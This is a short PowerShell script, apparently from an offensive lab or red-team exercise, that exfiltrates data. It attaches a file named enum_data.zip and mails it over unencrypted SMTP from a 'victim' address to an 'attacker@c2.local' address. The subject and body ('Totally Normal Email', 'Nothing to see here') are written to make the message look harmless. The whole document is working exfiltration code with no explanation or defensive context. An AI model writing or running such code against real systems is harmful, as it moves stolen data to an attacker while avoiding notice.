$attachment = "C:\temp\enum_data.zip"
$smtp = New-Object System.Net.Mail.SmtpClient("10.0.17.27", 25)
$smtp.EnableSsl = $false
$msg = New-Object System.Net.Mail.MailMessage
$msg.From = "victim@target.local"
$msg.To.Add("attacker@c2.local")
$msg.Subject = "Totally Normal Email"
$msg.Body = "Nothing to see here."
$msg.Attachments.Add($attachment)
$smtp.Send($msg)
